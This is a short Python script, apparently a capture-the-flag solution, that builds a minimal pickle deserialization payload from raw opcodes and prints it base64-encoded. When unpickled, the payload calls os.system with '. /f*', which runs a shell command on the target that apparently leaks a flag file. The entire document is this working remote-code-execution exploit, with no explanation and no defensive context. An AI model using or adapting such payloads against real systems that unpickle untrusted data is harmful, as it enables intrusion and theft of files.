import base64

from pickle import PROTO, SHORT_BINUNICODE, GLOBAL, TUPLE1, REDUCE, STOP

golf_payload = \
    GLOBAL + b"os\nsystem\n" + \
    SHORT_BINUNICODE + b"\x05" + b". /f*" + \
    TUPLE1 + \
    REDUCE + \
    STOP

print(base64.b64encode(golf_payload).decode("utf-8"))
